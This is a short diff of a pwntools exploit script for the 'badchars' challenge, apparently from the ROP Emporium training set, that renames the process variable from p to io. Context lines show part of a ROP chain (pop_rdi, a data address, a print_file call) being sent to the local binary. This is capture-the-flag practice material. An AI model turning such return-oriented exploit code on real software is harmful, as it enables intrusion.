@@ -1,6 +1,6 @@
 from pwn import *
 
-p = process('./badchars')
+io = process('./badchars')
 
 debug = False
 
@@ -40,6 +40,6 @@ payload += pop_rdi
 payload += p64(reserved_addr_data)
 payload += print_file_call
 
-# Send and interact
-p.sendline(payload)
-p.interactive()
+# send and interact
+io.sendline(payload)
+io.interactive()
